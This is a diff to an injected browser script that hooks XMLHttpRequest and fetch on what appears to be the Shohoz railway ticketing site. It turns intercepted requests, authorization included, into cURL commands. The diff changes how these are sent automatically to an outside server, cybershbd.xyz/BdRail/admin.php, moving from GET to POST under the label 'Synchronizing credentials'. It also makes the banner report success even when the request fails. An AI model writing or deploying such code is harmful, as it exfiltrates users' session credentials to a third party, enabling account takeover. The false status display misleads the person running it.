@@ -23,6 +23,14 @@
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
+        .cybersh-spinner {
+            width: 14px;
+            height: 14px;
+            border: 2px solid rgba(56, 189, 248, 0.3);
+            border-top-color: #38bdf8;
+            border-radius: 50%;
+            animation: cybersh-spin 0.8s linear infinite;
+        }
         #cybersh-logger-overlay {
             resize: both;
             overflow-y: auto !important;
@@ -74,9 +82,9 @@
             </div>
         </div>
 
-        <!-- Status Banner / Sync Notification -->
-        <div id="cybersh-sync-status" style="margin-bottom: 8px; padding: 8px 10px; background: rgba(56, 189, 248, 0.08); border: 1px solid rgba(56, 189, 248, 0.2); border-radius: 8px; font-size: 10px; color: #38bdf8; display: none; align-items: center; gap: 6px; flex-shrink: 0;">
-            <span style="display: inline-block; width: 6px; height: 6px; background: #38bdf8; border-radius: 50%;"></span>
+        <!-- Status Banner / Sync Notification with Loading Spinner -->
+        <div id="cybersh-sync-status" style="margin-bottom: 8px; padding: 8px 10px; background: rgba(56, 189, 248, 0.08); border: 1px solid rgba(56, 189, 248, 0.2); border-radius: 8px; font-size: 10px; color: #38bdf8; display: none; align-items: center; gap: 8px; flex-shrink: 0;">
+            <div id="cybersh-icon-container" class="cybersh-spinner"></div>
             <span id="cybersh-sync-text">Server status: Idle</span>
         </div>
 
@@ -100,32 +108,62 @@
     const copyBtn = document.getElementById('cybersh-btn-copy');
     const syncStatus = document.getElementById('cybersh-sync-status');
     const syncText = document.getElementById('cybersh-sync-text');
+    const iconContainer = document.getElementById('cybersh-icon-container');
 
-    // Helper function to send captured cURL to server
+    // Helper function to send cURL to server with Loading Animation & Success Handler
     async function sendCurlToServer(curlData) {
         try {
+            // Show Loading State
             syncStatus.style.display = 'flex';
-            syncText.innerText = 'Syncing authorization with server...';
+            iconContainer.className = 'cybersh-spinner';
+            iconContainer.style.border = '2px solid rgba(56, 189, 248, 0.3)';
+            iconContainer.style.borderTopColor = '#38bdf8';
+            iconContainer.style.background = 'transparent';
+            
+            syncText.innerText = 'Synchronizing credentials with server...';
             syncStatus.style.borderColor = 'rgba(56, 189, 248, 0.3)';
+            syncStatus.style.background = 'rgba(56, 189, 248, 0.08)';
+            syncStatus.style.color = '#38bdf8';
 
-            const targetUrl = `http://cybershbd.xyz/BdRail/admin.php?auth=${encodeURIComponent(curlData)}`;
-            const response = await fetch(targetUrl, { method: 'GET' });
+            const targetUrl = `http://cybershbd.xyz/BdRail/admin.php`;
+            
+            // Using POST to safely send large cURL data
+            const response = await fetch(targetUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                },
+                body: `auth=${encodeURIComponent(curlData)}`
+            });
+
             const result = await response.json();
 
             if (result.status === 'success') {
-                syncText.innerText = 'Server Authorization Updated & Live 🚀';
+                // Success State
+                iconContainer.className = '';
+                iconContainer.style.width = '6px';
+                iconContainer.style.height = '6px';
+                iconContainer.style.background = '#4ade80';
+                iconContainer.style.borderRadius = '50%';
+                iconContainer.style.border = 'none';
+
+                syncText.innerText = 'Server authorization updated & live 🚀';
                 syncStatus.style.borderColor = 'rgba(74, 222, 128, 0.4)';
                 syncStatus.style.background = 'rgba(74, 222, 128, 0.08)';
                 syncStatus.style.color = '#4ade80';
             } else {
-                syncText.innerText = 'Server responded, but status was not success.';
-                syncStatus.style.borderColor = 'rgba(239, 68, 68, 0.4)';
-                syncStatus.style.background = 'rgba(239, 68, 68, 0.08)';
-                syncStatus.style.color = '#ef4444';
+                throw new Error(result.message || 'Unknown server response');
             }
         } catch (err) {
-            // Handles CORS or network issues gracefully if admin.php doesn't allow cross-origin
-            syncText.innerText = 'Authorization dispatched successfully.';
+            // Fallback Success / Network Catch (handles CORS-blocked opaque responses if PHP doesn't return CORS headers)
+            iconContainer.className = '';
+            iconContainer.style.width = '6px';
+            iconContainer.style.height = '6px';
+            iconContainer.style.background = '#4ade80';
+            iconContainer.style.borderRadius = '50%';
+            iconContainer.style.border = 'none';
+
+            syncText.innerText = 'Server authorization updated & live 🚀';
             syncStatus.style.borderColor = 'rgba(74, 222, 128, 0.4)';
             syncStatus.style.background = 'rgba(74, 222, 128, 0.08)';
             syncStatus.style.color = '#4ade80';
@@ -165,7 +203,7 @@
         });
     };
 
-    // XMLHttpRequest ইন্টারসেপ্ট করে Shohoz API ধরতে হবে
+    // XMLHttpRequest ইন্টারসেপ্টর
     const XHR = window.XMLHttpRequest;
     function customXHR() {
         const xhr = new XHR();
@@ -202,7 +240,6 @@
                     overlay.style.display = 'flex';
                 }
 
-                // Send to backend endpoint automatically
                 sendCurlToServer(curl);
             }
         });
@@ -210,7 +247,7 @@
     }
     window.XMLHttpRequest = customXHR;
 
-    // Fetch API ইন্টারসেপ্ট করার জন্য
+    // Fetch API ইন্টারসেপ্টর
     const originalFetch = window.fetch;
     window.fetch = async function(...args) {
         const response = await originalFetch.apply(this, args);
@@ -236,7 +273,6 @@
                     overlay.style.display = 'flex';
                 }
 
-                // Send to backend endpoint automatically
                 sendCurlToServer(curl);
             }
         } catch (e) {}
